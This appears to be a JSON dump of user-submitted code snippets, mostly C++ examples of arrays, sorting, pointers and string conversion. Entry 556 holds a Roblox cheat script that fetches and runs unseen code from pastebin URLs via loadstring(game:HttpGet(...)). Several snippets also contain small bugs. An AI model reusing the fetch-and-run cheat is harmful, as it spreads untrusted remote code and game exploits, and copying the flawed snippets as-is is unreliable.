    "description": "void myFunction(int param[]) {    .    .    . } \n",
    "reg_date": "2021-10-12T11:37:22.000Z"
  },
  {
    "id": 534,
    "keyword": null,
    "link": null,
    "title": " array c++",
    "description": "int nums[100] = {0}; // initiallize all values to 0  int nums[5] = {1,2,3,4,5};  // type name[size] = {values};\n#include <iostream> using std::cout;  int a[] = { 1, 2, 3, 4, 5 }; int counta()   {   return sizeof( a ) / sizeof( a[ 0 ] );  // works, since a[] is an array   }  int countb( int b[] )   {   return sizeof( b ) / sizeof( b[ 0 ] );  // fails, since b[] is a pointer   }\nint foo [] = { 16, 2, 77, 40, 12071 };\n#include <iostream> #include <array> //for using std::array  int main() {  \tint example[5];//array on stack \tint* another = new int[5];//array on heap \tdelete[] another;//freeing up memory on heap \texample[0] = 1; \texample[1] = 2; \texample[2] = 3; \texample[3] = 4; \tfor (int i = 0; i < 5; i++) { \t\texample[i] = 2; \t} \tint* ptr = example;//arrays are just pointers to the begining of the block of memory \texample[2] = 5; \t*(ptr + 2) = 6;//adding 4+4 bytes to ptr \tstd::cout << example[2] << std::endl;//output => 6 \t*(int*)((char*)ptr + 8) = 8;//adding 8 bytes to ptr using ptr arithmetic \tstd::cout << example[2] << std::endl;//output => 8 \t//std::array provide some additional functionality like bounce checking size checking but do have a performance overhead \tstd::array<int,5> stda;//creating an array named stda of int 5 size \tstd::cout << stda.size() << std::endl;//will output size of std::array ,output =>5        std::cin.get(); }\nint foo [5];\n// An example of using std::array // Basic syntax: std::array<TYPE, SIZE> NAME; // Note that the size must be a constant  #include <iostream> #include <array> // Use std::array  int main() { \tstd::array<int, 10> arr;   \tarr[0] = 5; // Setting an element   \tstd::cout << arr[0] << std::endl; // Element access   \tstd::cout << arr.at(0) << std::endl; // Element access with bounds checking }\n",
    "reg_date": "2021-10-12T11:37:22.000Z"
  },
  {
    "id": 535,
    "keyword": null,
    "link": null,
    "title": " array c plus plus",
    "description": "int foo[5] = {0};\nx = foo[2];\n",
    "reg_date": "2021-10-12T11:37:22.000Z"
  },
  {
    "id": 536,
    "keyword": null,
    "link": null,
    "title": " array copx c++",
    "description": "#include <algorithm> //Only needed for Option 1 #include <iostream>  using namespace std;  int main() {   \t//Option 1     const int len{3};     int arr1[len] = {1,2,3};     int arr2[len]; //Will be the copy of arr1     copy(begin(arr1), end(arr1), begin(arr2));      \t//Use the following, if you are not using namespace std;     //std::copy(std::begin(arr), std::end(arr), std::begin(copy));        //Option 2     int arr3[len]; //Will be the copy of arr1     for(int i = 0; i<len; ++i) {       arr3[i] = arr1[3];     }          return 0; //exitcode };\n",
    "reg_date": "2021-10-12T11:37:22.000Z"
  },
  {
    "id": 537,
    "keyword": null,
    "link": null,
    "title": " array declaration c++",
    "description": "#include <iostream> using std::cout;  int a[] = { 1, 2, 3, 4, 5 }; int counta()   {   return sizeof( a ) / sizeof( a[ 0 ] );  // works, since a[] is an array   }  int countb( int b[] )   {   return sizeof( b ) / sizeof( b[ 0 ] );  // fails, since b[] is a pointer   }\nint foo [] = { 16, 2, 77, 40, 12071 };\n#include <iostream> #include <array> //for using std::array  int main() {  \tint example[5];//array on stack \tint* another = new int[5];//array on heap \tdelete[] another;//freeing up memory on heap \texample[0] = 1; \texample[1] = 2; \texample[2] = 3; \texample[3] = 4; \tfor (int i = 0; i < 5; i++) { \t\texample[i] = 2; \t} \tint* ptr = example;//arrays are just pointers to the begining of the block of memory \texample[2] = 5; \t*(ptr + 2) = 6;//adding 4+4 bytes to ptr \tstd::cout << example[2] << std::endl;//output => 6 \t*(int*)((char*)ptr + 8) = 8;//adding 8 bytes to ptr using ptr arithmetic \tstd::cout << example[2] << std::endl;//output => 8 \t//std::array provide some additional functionality like bounce checking size checking but do have a performance overhead \tstd::array<int,5> stda;//creating an array named stda of int 5 size \tstd::cout << stda.size() << std::endl;//will output size of std::array ,output =>5        std::cin.get(); }\nint foo [5];\n// Two dimensional array int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5  // Three dimensional array //[2] is elements; [3] is rows in elements; [4] is column in elemnents  int a[2][3][2]= {         //Element 0         { {1, 2},            {2, 3},            {4, 5}                       },                           // Element 1         { {6, 7},            {8, 9},            {10, 11}                       }     };          cout << a[0][1][1]; // Prints 3 \n// datatype var_name[howmuch value you need to store] = {values, values} int a[5] = {1, 2 3, 4, 5};\n",
    "reg_date": "2021-10-12T11:37:22.000Z"
  },
  {
    "id": 538,
    "keyword": null,
    "link": null,
    "title": " array di struct",
    "description": "casella arrayCaselle[10]; arrayCaselle[0].riga='a'; cout<<arrayCaselle[0].riga;\n",
    "reg_date": "2021-10-12T11:37:22.000Z"
  },
  {
    "id": 539,
    "keyword": null,
    "link": null,
    "title": " array filling problem code arrfill",
    "description": "#include<bits/stdc++.h> using namespace std; typedef long long ll;  int main() {   ios_base::sync_with_stdio(0);   cin.tie(0);   cout.tie(0);      int t;   cin >> t;   while(t--) {     ll n, m;     cin>>n>>m;      vector<pair<int,int>>vp;     for (int i=0; i < m; i++)     {       ll x, y;       cin>>x>>y;       vp.push_back({x,y});     }      sort(vp.begin(), vp.end(), greater<pair<int,int>>());          ll lcm=1;     ll rem=n;     ll res=0;           for (int i=0; i<m && rem>0; i++){         ll a= vp[i].first,b=vp[i].second;         lcm = lcm*b/__gcd(lcm,b);         res += (rem-n/lcm)*a;         rem= n/lcm;     }      cout <<res<<endl;   }   return 0; }\n",
    "reg_date": "2021-10-12T11:37:22.000Z"
  },
  {
    "id": 540,
    "keyword": null,
    "link": null,
    "title": " array header,  <array>",
    "description": "#include <iostream> #include <array> using namespace std;  int main() {   array<int,3> myarray {10,20,30};    for (int i=0; i<myarray.size(); ++i)     ++myarray[i];    for (int elem : myarray)     cout << elem << '\\n'; } \n",
    "reg_date": "2021-10-12T11:37:23.000Z"
  },
  {
    "id": 541,
    "keyword": null,
    "link": null,
    "title": " array in c++",
    "description": "#include <iostream> using std::cout;  int a[] = { 1, 2, 3, 4, 5 }; int counta()   {   return sizeof( a ) / sizeof( a[ 0 ] );  // works, since a[] is an array   }  int countb( int b[] )   {   return sizeof( b ) / sizeof( b[ 0 ] );  // fails, since b[] is a pointer   }\nint foo [] = { 16, 2, 77, 40, 12071 };\n#include <iostream> #include <array> //for using std::array  int main() {  \tint example[5];//array on stack \tint* another = new int[5];//array on heap \tdelete[] another;//freeing up memory on heap \texample[0] = 1; \texample[1] = 2; \texample[2] = 3; \texample[3] = 4; \tfor (int i = 0; i < 5; i++) { \t\texample[i] = 2; \t} \tint* ptr = example;//arrays are just pointers to the begining of the block of memory \texample[2] = 5; \t*(ptr + 2) = 6;//adding 4+4 bytes to ptr \tstd::cout << example[2] << std::endl;//output => 6 \t*(int*)((char*)ptr + 8) = 8;//adding 8 bytes to ptr using ptr arithmetic \tstd::cout << example[2] << std::endl;//output => 8 \t//std::array provide some additional functionality like bounce checking size checking but do have a performance overhead \tstd::array<int,5> stda;//creating an array named stda of int 5 size \tstd::cout << stda.size() << std::endl;//will output size of std::array ,output =>5        std::cin.get(); }\n// Two dimensional array int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5  // Three dimensional array //[2] is elements; [3] is rows in elements; [4] is column in elemnents  int a[2][3][2]= {         //Element 0         { {1, 2},            {2, 3},            {4, 5}                       },                           // Element 1         { {6, 7},            {8, 9},            {10, 11}                       }     };          cout << a[0][1][1]; // Prints 3 \nint jimmy [3][5];\nchar century [100][365][24][60][60];\n",
    "reg_date": "2021-10-12T11:37:23.000Z"
  },
  {
    "id": 542,
    "keyword": null,
    "link": null,
    "title": " array length c++",
    "description": "int arr[5]; int len = sizeof(arr) / sizeof(arr[0]); // returns 5\nint a[20]; int length; length = sizeof(a) / sizeof(int); \n#include <iostream> using namespace std; int main() {    int arr[5] = {4, 1, 8, 2, 9};    int len = sizeof(arr)/sizeof(arr[0]);    cout << \"The length of the array is: \" << len;    return 0; }\n#include <iostream> using namespace std;  #define size(type) ((char *)(&type+1)-(char*)(&type))  int main(){   int arr[5] = {1, 2, 3, 4, 5};   cout << size(arr) / size(arr[0]) << endl; //returns 5   //alternatively   cout << sizeof(arr) / sizeof(int) << endl; //returns 5 }\nint size = sizeof(arr)/sizeof(arr[0])\n// array::size #include <iostream> #include <array>  int main () {   std::array<int,5> myints;   std::cout << \"size of myints: \" << myints.size() << std::endl;   std::cout << \"sizeof(myints): \" << sizeof(myints) << std::endl;    return 0; }\n",
    "reg_date": "2021-10-12T11:37:23.000Z"
  },
  {
    "id": 543,
    "keyword": null,
    "link": null,
    "title": " array of pointers in cpp complete course",
    "description": "#include <iostream>   using namespace std; const int MAX = 3;   int main () {    int  var[MAX] = {10, 100, 200};    int *ptr[MAX];      for (int i = 0; i < MAX; i++) {       ptr[i] = &var[i]; // assign the address of integer.    }        for (int i = 0; i < MAX; i++) {       cout << \"Value of var[\" << i << \"] = \";       cout << *ptr[i] << endl;    }        return 0; }\n",
    "reg_date": "2021-10-12T11:37:23.000Z"
  },
  {
    "id": 544,
    "keyword": null,
    "link": null,
    "title": " array search c++",
    "description": "#include <iostream> 2 #include <array> 3 #include <string> 4 #include <algorithm> 5 6 using namespace std; 7 8 int main(){ 9 array<string, 4> colours = {\"blue\", \"black\", \"red\", \"green\"}; 10 sort(colours.begin(), colours.end()); //must be sorted 11 string key = \"black\"; 12 //look for black 13 bool found = binary_search(colours.begin(), colours.end(), key); 14 if (found){ 15 cout << \"We found the key 'black'\" << endl; 16 } 17 return 0; 18 }\n",
    "reg_date": "2021-10-12T11:37:23.000Z"
  },
  {
    "id": 545,
    "keyword": null,
    "link": null,
    "title": " array sort c++",
    "description": "// C++ program to demonstrate default behaviour of  // sort() in STL.  #include <bits/stdc++.h>  using namespace std;     int main()  {      int arr[] = {1, 5, 8, 9, 6, 7, 3, 4, 2, 0};      int n = sizeof(arr)/sizeof(arr[0]);         sort(arr, arr+n);         cout << \"\\nArray after sorting using \"          \"default sort is : \\n\";      for (int i = 0; i < n; ++i)          cout << arr[i] << \" \";         return 0;  } \n#include <bits/stdc++.h>  using namespace std;   #define size(arr) sizeof(arr)/sizeof(arr[0]);   int main(){      int a[5] = {5, 2, 6,3 ,5};     int n = size(a);     sort((a), a + n);     for(int i = 0; i < n; i++){         cout << a[i];     }       return 0;  } \nsort(arr, arr+length); //increase sort(arr, arr+length, greater<int>()); //decrease \n#include <algorithm> #include <iostream> #include <array> using namespace std;  int main() {     array<int, 5> arraysort{ 4,2,3,5,1 };     sort(arraysort.begin(), arraysort.end());     for (int i = 0; i < arraysort.size(); i++) {         cout << arraysort[i] << \" \";     } \treturn 0;  }\n#include <iostream> 2 #include <array> 3 #include <string> 4 #include <algorithm> 5 6 using namespace std; 7 8 int main(){ 9 array<string, 4> colours = {\"blue\", \"black\", \"red\", \"green\"}; 10 for (string colour : colours){ 11 cout << colour << ' '; 12 } 13 cout << endl; 14 sort(colours.begin(), colours.end()); 15 for (string colour : colours){ 16 cout << colour << ' '; 17 } 18 return 0; 19 } 66 20 21 /* 22 Output: 23 blue black red green 24 black blue green red 25 */\nstd::vector s = {5, 1, 3, 6, 2,}; std::sort(s.begin(), s.end());\n",
    "reg_date": "2021-10-12T11:37:23.000Z"
  },
  {
    "id": 546,
    "keyword": null,
    "link": null,
    "title": " array syntax in c++",
    "description": "int foo [] = { 16, 2, 77, 40, 12071 };\n// An example of using std::array // Basic syntax: std::array<TYPE, SIZE> NAME; // Note that the size must be a constant  #include <iostream> #include <array> // Use std::array  int main() { \tstd::array<int, 10> arr;   \tarr[0] = 5; // Setting an element   \tstd::cout << arr[0] << std::endl; // Element access   \tstd::cout << arr.at(0) << std::endl; // Element access with bounds checking }\nint bar [5] = { 10, 20, 30 };  \nint foo[] = { 10, 20, 30 }; int foo[] { 10, 20, 30 }; \n",
    "reg_date": "2021-10-12T11:37:23.000Z"
  },
  {
    "id": 547,
    "keyword": null,
    "link": null,
    "title": " array template c++",
    "description": "#include <iostream> #include <array> using namespace std;  int main () {     const int size = 5;     array<int, size> numbers; // create stl array template     array<int, size> :: iterator NUMBER_ITERATOR; // declare iterator that points to stl template numbahs      NUMBER_ITERATOR = numbers.begin(); // points iterator to first element in array template      cout << \"Please fill the array: \\n\";     for(;NUMBER_ITERATOR != numbers.end(); NUMBER_ITERATOR++) cin >> *NUMBER_ITERATOR; // enter the value for each element one-by-one      NUMBER_ITERATOR = numbers.begin(); // reset the pointer to first element     cout << \"Displaying array: \\n\";      for(;NUMBER_ITERATOR != numbers.end(); NUMBER_ITERATOR++) cout << *NUMBER_ITERATOR << \"\\n\"; // prints out value for each     cout << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:37:23.000Z"
  },
  {
    "id": 548,
    "keyword": null,
    "link": null,
    "title": " arrays and pointer in c++",
    "description": "#include<iostream> int main() {\t   // three ways to enter the values of arrays    int array[] {1,2,3};      // Array subscript notation   std::cout<<array[0]<<std::endl;// 1    std::cout<<array[1]<<std::endl;// 2   std::cout<<array[2]<<std::endl;// 3      // Pointer subscript notation   int *array_ptr ={array};   std::cout<<array_ptr[0]<<std::endl;//1   std::cout<<array_ptr[1]<<std::endl;//2   std::cout<<array_ptr[2]<<std::endl;//3      //Array offset notation       std::cout<<*array<<std::endl;//1    std::cout<<*(array+1)<<std::endl;//2    std::cout<<*(array+2)<<std::endl;//3      //Pointer offset notation    std::cout<<*array_ptr<<std::endl;//1    std::cout<<*(array_ptr+1)<<std::endl;//2    std::cout<<*(array_ptr+2)<<std::endl;//3              return 0;    }\n",
    "reg_date": "2021-10-12T11:37:23.000Z"
  },
  {
    "id": 549,
    "keyword": null,
    "link": null,
    "title": " arrays in c++",
    "description": "int foo [] = { 16, 2, 77, 40, 12071 };\n#include <iostream> #include <array> //for using std::array  int main() {  \tint example[5];//array on stack \tint* another = new int[5];//array on heap \tdelete[] another;//freeing up memory on heap \texample[0] = 1; \texample[1] = 2; \texample[2] = 3; \texample[3] = 4; \tfor (int i = 0; i < 5; i++) { \t\texample[i] = 2; \t} \tint* ptr = example;//arrays are just pointers to the begining of the block of memory \texample[2] = 5; \t*(ptr + 2) = 6;//adding 4+4 bytes to ptr \tstd::cout << example[2] << std::endl;//output => 6 \t*(int*)((char*)ptr + 8) = 8;//adding 8 bytes to ptr using ptr arithmetic \tstd::cout << example[2] << std::endl;//output => 8 \t//std::array provide some additional functionality like bounce checking size checking but do have a performance overhead \tstd::array<int,5> stda;//creating an array named stda of int 5 size \tstd::cout << stda.size() << std::endl;//will output size of std::array ,output =>5        std::cin.get(); }\nint foo [5];\n// Two dimensional array int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5  // Three dimensional array //[2] is elements; [3] is rows in elements; [4] is column in elemnents  int a[2][3][2]= {         //Element 0         { {1, 2},            {2, 3},            {4, 5}                       },                           // Element 1         { {6, 7},            {8, 9},            {10, 11}                       }     };          cout << a[0][1][1]; // Prints 3 \n// datatype var_name[howmuch value you need to store] = {values, values} int a[5] = {1, 2 3, 4, 5};\n// An example of using std::array // Basic syntax: std::array<TYPE, SIZE> NAME; // Note that the size must be a constant  #include <iostream> #include <array> // Use std::array  int main() { \tstd::array<int, 10> arr;   \tarr[0] = 5; // Setting an element   \tstd::cout << arr[0] << std::endl; // Element access   \tstd::cout << arr.at(0) << std::endl; // Element access with bounds checking }\n",
    "reg_date": "2021-10-12T11:37:24.000Z"
  },
  {
    "id": 550,
    "keyword": null,
    "link": null,
    "title": " arrays left rotation hackerrank solution",
    "description": "int n,d;     cin>>n;     int a[n];     cin>>d;     for(int i=0;i<n;cin>>a[i],i++);     d=d%n;     for(int i=d;i<n;i++)         cout<<a[i]<<\" \";          for(int i=0;i<d;i++)          cout<<a[i]<<\" \";     return 0; \n",
    "reg_date": "2021-10-12T11:37:24.000Z"
  },
  {
    "id": 551,
    "keyword": null,
    "link": null,
    "title": " arrow operator c++",
    "description": "/*   the arrow operator is used for accessing members (fields or methods)  of a class or struct    it dereferences the type, and then performs an element selection (dot) operation */  #include <iostream> using std::cout;  class Entity { public: \tconst char* name = nullptr; private: \tint x, y; public: \tEntity(int x, int y, const char* name) \t\t: x(x), y(y), name(name) { \t\tprintEntityPosition(this); // \"this\" just means a pointer to the current Entity \t}  \tint getX() { return x; } \tint getY() { return y; }  \tfriend void printEntityPosition(Entity* e);  };  // accessing methods using arrow void printEntityPosition(Entity* e) { \tcout << \"Position: \" << e->getX() << \", \" << e->getY() << \"\\n\"; }  int main() { \t/* ----- ARROW ----- */  \tEntity* pointer = new Entity(1, 1, \"Fred\"); \t//printEntityPosition(pointer); redacted for redundancy (say that 5 times fast) \t   \tcout << (*pointer).name << \"\\n\"; // behind the scenes \tcout << pointer->name << \"\\n\"; // print the name (with an arrow)  \t/* ----- NOT ARROW ----- */  \tEntity not_a_pointer(2, 2, \"Derf\"); \t//printEntityPosition(&not_a_pointer); & to convert to pointer  \tcout << not_a_pointer.name << \"\\n\"; // print the name (with a dot)  \t/* ----- LITERALLY NEITHER ----- */  \tstd::cin.get(); // wait for input \treturn 0; // exit program }  \n",
    "reg_date": "2021-10-12T11:37:24.000Z"
  },
  {
    "id": 552,
    "keyword": null,
    "link": null,
    "title": " articulation point in a graph",
    "description": "//Articulation point is a point in the graph on whose removal graph is broken into components //striver graph series //Do check u__code on youtube #include<bits/stdc++.h> using namespace std; void addedge(vector<int>adj[],int u,int v) {     adj[u].push_back(v);     adj[v].push_back(u); } void dfs(int node,int parent,vector<int>&visited,vector<int>&low,vector<int>&tin,vector<int>adj[],int timer,vector<int>&isarticulate) {     visited[node]=1;     low[node]=tin[node]=timer++;     int child=0;     for(auto it:adj[node])     {         if(it==parent)             continue;         if(!visited[it])         {             dfs(it,node,visited,low,tin,adj,timer,isarticulate);             low[node]=min(low[node],low[it]);             if(low[it]>=tin[node]&&parent!=-1)             {                 isarticulate[node]=1;             }         }         else         {             low[node]=min(low[node],tin[it]);         }     }     if(parent==-1&&child>1)         isarticulate[node]=1; } int main() {     int vertex,edges;     cout<<\"ENTER THE VERTEX AND EDGES:\"<<endl;     cin>>vertex>>edges;     vector<int>adj[vertex];     int a,b;     cout<<\"ENTER THE LINKS:\"<<endl;     for(int i=0;i<edges;i++)     {         cin>>a>>b;         addedge(adj,a,b);     }     vector<int>tin(vertex,-1);     vector<int>low(vertex,-1);     vector<int>visited(vertex,0);     vector<int>isarticulate(vertex,0);     int timer=0;     for(int i=0;i<vertex;i++)     {         if(!visited[i])         {             dfs(i,-1,visited,low,tin,adj,timer,isarticulate);         }     }     for(int i=0;i<vertex;i++)     {         if(isarticulate[i]==1)         {             cout<<i<<\" \";         }     }     return 0; } \n",
    "reg_date": "2021-10-12T11:37:24.000Z"
  },
  {
    "id": 553,
    "keyword": null,
    "link": null,
    "title": " ascii allowed in c++",
    "description": "#include <iostream> int main() {   std::cout << \"Printable ASCII [32..126]:\\n\";   for (char i = ' '; i <= '~'; ++i) {     std::cout << i << ((i % 16 == 15) ? '\\n' : ' ');   } }\n",
    "reg_date": "2021-10-12T11:37:24.000Z"
  },
  {
    "id": 554,
    "keyword": null,
    "link": null,
    "title": " ascii cpp",
    "description": "#include<iostream> using namespace std; int main () {     char c;     cout << \"Enter a character : \";     cin >> c;     cout << \"ASCII value of \" << c <<\" is :  \" << (int)c;     return 0; }\n#include <iostream> using namespace std;  int main() {  char c;  cout << \"Enter a character: \";  cin >> c;  cout << \"ASCII Value of \" << c << \" is \" << int(c);  return 0; }\n",
    "reg_date": "2021-10-12T11:37:24.000Z"
  },
  {
    "id": 555,
    "keyword": null,
    "link": null,
    "title": " ascii to hex c++",
    "description": "#include <sstream> std::stringstream sstream; sstream << std::hex << (my_char - 0); std::string result = sstream.str();  // result = hexadecimal string value of the ascii value of my_char\n01000000000000000000000000000100007F00001389\n",
    "reg_date": "2021-10-12T11:37:24.000Z"
  },
  {
    "id": 556,
    "keyword": null,
    "link": null,
    "title": " asd",
    "description": "string propertyName string pseudoElement float elapsedTime\n 1.0.0 \nmap.\npublic static $model = Customer::class;\nfetch('https://jsonplaceholder.typicode.com/todos/')   .then(response => response.json())   .then(json => console.log(json))\n game:GetService(\"StarterGui\"):SetCore(\"SendNotification\",{     Title = \"Script by TrinityModz\";     Text = \"Subscribe to TrinityModz on youtube for more scripts!\"; }) game:GetService(\"StarterGui\"):SetCore(\"SendNotification\",{     Title = \"Enjoy!\";     Text = \"\"; })  --Into Rdite if game.PlaceId == 4913581664 then loadstring(game:HttpGet(\"https://pastebin.com/raw/j4iCzg40\"))() end  --Into guywithapoo  if game.PlaceId == 5499911356 then loadstring(game:HttpGet(\"https://pastebin.com/raw/nf9Qe814\"))() end  --Cart ride into Albert  if game.PlaceId == 5475935012 then loadstring(game:HttpGet(\"https://pastebin.com/raw/pa5VxTiw\"))() end  --Into Nicki Minaj if game.PlaceId == 5299786474 then loadstring(game:HttpGet(\"https://pastebin.com/raw/tzvL4K1Q\"))() end  --Into Noob if game.PlaceId == 5072930687 then loadstring(game:HttpGet(\"https://pastebin.com/raw/t3qadvju\"))() end  --Into Zombie if game.PlaceId == 4973296096 then loadstring(game:HttpGet(\"https://pastebin.com/raw/QzzcV7c6\"))() end  --Into James if game.PlaceId == 5008344562 then loadstring(game:HttpGet(\"https://pastebin.com/raw/8PzDANSx\"))() end  --Cart ride into Among us   if game.PlaceId == 474648978 then loadstring(game:HttpGet(\"https://pastebin.com/raw/r6C2sHCw\"))() end  --Cart ride into DanTDM  if game.PlaceId == 439116338 then   local Material = loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua\"))()  local UI = Material.Load({      Title = \"Cart Ride Into DanTDM\",      Style = 1,      SizeX = 300,      SizeY = 300,      Theme = \"Dark\",       ColorOverrides = {         MainFrame = Color3.fromRGB(2, 2, 2)       }      }) local Page = UI.New({     Title = \"Into DanTDM\" })  Page.Button({         Text = \"Spasm\",         Callback = function()     _G.Loopname = true     while _G.Loopname do     wait(0.1)     for i,v in pairs(workspace:GetDescendants()) do \t\t\tif v:IsA(\"ClickDetector\") then \t\t\t\tfireclickdetector(v) \t\tend       end    end end })  Page.Button({         Text = \"Stop Spasm\",         Callback = function()     _G.Loopname = true     while _G.Loopname do     wait(0.1)     for i,v in pairs(workspace:GetDescendants()) do \t\t\tif v:IsA(\"ClickDetector\") then \t\t\t\tfireclickdetector(v)       end      end     end    end   }) end  --Cart ride into minions for admin  if game.PlaceId == 70934006 then     loadstring(game:HttpGet(\"https://pastebin.com/raw/SgG3ViUC\"))()           --loadstring(game:HttpGet(\"https://pastebin.com/raw/DtepAWxp\"))()      end \n",
    "reg_date": "2021-10-12T11:37:24.000Z"
  },
  {
    "id": 557,
    "keyword": null,
    "link": null,
    "title": " ask a question and answer it in code c++",
    "description": "if (answer == 'n') {     return 0; } else if (answer == 'y') {     // do something } else {     cout << \"Invalid input...\" << endl; }\n",
    "reg_date": "2021-10-12T11:37:24.000Z"
  },
  {
    "id": 558,
    "keyword": null,
    "link": null,
    "title": " assegnare valori in c++",
    "description": "// sintassi per la dichiarazione e definizione di una variabile <tipo> <identificatore> = <valore>; // esempi di dichiarazione e definizione int x = -1; bool flag = false;\n",
    "reg_date": "2021-10-12T11:37:25.000Z"
  },
  {
    "id": 559,
    "keyword": null,
    "link": null,
    "title": " assert c++",
    "description": "static_assert(true); // if condition is false, then assert go boom this is false and stops the code\nassert(std::is_same_v<int, int>); // error: assert does not take two arguments assert((std::is_same_v<int, int>)); // OK: one argument static_assert(std::is_same_v<int, int>); // OK: not a macro std::complex<double> c; assert(c == std::complex<double>{0, 0}); // error assert((c == std::complex<double>{0, 0})); // OK\nstatic_assert(sizeof(long) == 8, \"long must be 8 bytes\"); static_assert(sizeof(int) == 4, \"int must be 4 bytes\");   int main() { \treturn 0; } \n",
    "reg_date": "2021-10-12T11:37:25.000Z"
  },
  {
    "id": 560,
    "keyword": null,
    "link": null,
    "title": " assign array to array",
    "description": "#include <algorithm> int main() {   int numbers[5] = {1, 2, 3};   int values[5] = {};   std::copy(numbers, numbers + 5, values); }  \n",
    "reg_date": "2021-10-12T11:37:25.000Z"
  },
  {
    "id": 561,
    "keyword": null,
    "link": null,
    "title": " assignment operator with pointers c++",
    "description": "class Array { public:     Array(int N)     {          size = N;          arr = new int[N];     }      //destructor     ~Array()     {         delete[] arr;     }      //copy constructor     Array(const Array& arr2)     {         size = arr2.size;         arr = new int[size];         std::memcpy(arr, arr2.arr, size);     }      //overload = operator     Array& operator=(const Array& arr2)      {         if (this == &arr2)             return *this; //self assignment         if (arr != NULL)             delete[] arr; //clean up already allocated memory          size = arr2.size;         arr = new int[size];         std::memcpy(arr, arr2.arr, size);         return *this;     }  private:     int size;    //array elements     int *arr;    //dynamic array pointer };\n",
    "reg_date": "2021-10-12T11:37:25.000Z"
  },
  {
    "id": 562,
    "keyword": null,
    "link": null,
    "title": " assoc-right antlr",
    "description": "exp: exp TIMES exp|                     // Uses left assoc \t <assoc=right> exp TIMES exp |      // Uses right assoc \t /*epsilon*/;\n",
    "reg_date": "2021-10-12T11:37:25.000Z"
  },
  {
    "id": 563,
    "keyword": null,
    "link": null,
    "title": " associative array in php",
    "description": "<?php  /*  There are 3 Types of array in php   1. Indexed arrays - Arrays with a numeric index 2. Associative arrays - Arrays with named keys 3. Multidimensional arrays - Arrays containing one or more arrays  This is the second one - Associative arrays */  $age = array(\"Samy\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Samy'] . \" years old.\";  ?>\nfunction isAssoc(array $arr) {     if (array() === $arr) return false;     return array_keys($arr) !== range(0, count($arr) - 1); }  var_dump(isAssoc(['a', 'b', 'c'])); // false var_dump(isAssoc([\"0\" => 'a', \"1\" => 'b', \"2\" => 'c'])); // false var_dump(isAssoc([\"1\" => 'a', \"0\" => 'b', \"2\" => 'c'])); // true var_dump(isAssoc([\"a\" => 'a', \"b\" => 'b', \"c\" => 'c'])); // true \n<?php \t$associativeArray = [         \"carOne\" => \"BMW\",         \"carTwo\" => \"VW\",         \"carThree\" => \"Mercedes\"     ];          echo $associativeArray[\"carTwo\"] . \" Is a german brand\"; ?>\n<?php  /*  There are 3 Types of array in php   1. Indexed arrays - Arrays with a numeric index 2. Associative arrays - Arrays with named keys 3. Multidimensional arrays - Arrays containing one or more arrays  This is the second one - Associative arrays */  $age = array(\"Samy\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Peter'] . \" years old.\";  ?>\n<?php    /*   there are three type of array   \t1 - Indexed array   */  \t$a = array('a','b','c'); \t$b = ['a','b','c']; \t/*     2 - Associative array     */ \t$c = array(     \t'keyOne'=>'valueOne',       \t'keyTwo'=>'valueTwo'     ); \t$d = [       'keyOne'=>'valueOne',       'keyTwo'=>'valueTwo'     ]; /*     3 - Multidimensional  array     */ \t$c = array(     \t'keyOne'=>array('a','b','c'),       \t'keyTwo'=>array('a'=>'1','b'=>'2')     ); \t$d = [       'keyOne'=>['a','b','c'],       \t'keyTwo'=>['a'=>'1','b'=>'2']     ];   ?>\n$age = array(\"Peter\"\"35\", \"Ben\"\"37\", \"Joe\"\"43\"); \n",
    "reg_date": "2021-10-12T11:37:25.000Z"
  },
  {
    "id": 564,
    "keyword": null,
    "link": null,
    "title": " at c++ vector",
    "description": "      reference at (size_type n); const_reference at (size_type n) const;\n",
    "reg_date": "2021-10-12T11:37:25.000Z"
  },
  {
    "id": 565,
    "keyword": null,
    "link": null,
    "title": " atof in c",
    "description": "#include <stdio.h> #include <stdlib.h> #include <string.h>  int main () {    float val;    char str[20];        strcpy(str, \"98993489\");    val = atof(str);//returns the string as a floating point number    printf(\"String value = %s, Float value = %f\\n\", str, val);     strcpy(str, \"tutorialspoint.com\");    val = atof(str);    printf(\"String value = %s, Float value = %f\\n\", str, val);     return(0); }\n",
    "reg_date": "2021-10-12T11:37:25.000Z"
  },
  {
    "id": 566,
    "keyword": null,
    "link": null,
    "title": " atoi c++",
    "description": "Parses the C-string str interpreting its content as an integral number  If the converted value would be out of the range of representable values by an int, it causes undefined behavior.  /* atoi example */ #include <stdio.h>      /* printf, fgets */ #include <stdlib.h>     /* atoi */  int main () {   int i;   char buffer[256];    printf (\"Enter a number: \");   fgets (buffer, 256, stdin);   i = atoi (buffer);   printf (\"The value entered is %d. Its double is %d.\\n\",i,i*2);   return 0; }  \t /* Output */  Enter a number: 73 The value entered is 73. Its double is 146. \n#include <stdio.h> #include <stdlib.h> #include <string.h>  //CONVERT STRING TO INT  int main () {    int val;    char str[20];        strcpy(str, \"98993489\");    val = atoi(str);    printf(\"String value = %s, Int value = %d\\n\", str, val);     strcpy(str, \"tutorialspoint.com\");    val = atoi(str);    printf(\"String value = %s, Int value = %d\\n\", str, val);     return(0); }\n",
    "reg_date": "2021-10-12T11:37:25.000Z"
  },
  {
    "id": 567,
    "keyword": null,
    "link": null,
    "title": " attack on titan junior high list of episodes",
    "description": "",
    "reg_date": "2021-10-12T11:37:25.000Z"
  },
  {
    "id": 568,
    "keyword": null,
    "link": null,
    "title": " attention nlp",
    "description": "# visit following youtube video -- https://www.youtube.com/watch?v=z1xs9jdZnuY\n",
    "reg_date": "2021-10-12T11:37:26.000Z"
  },
  {
    "id": 569,
    "keyword": null,
    "link": null,
    "title": " auto in c++",
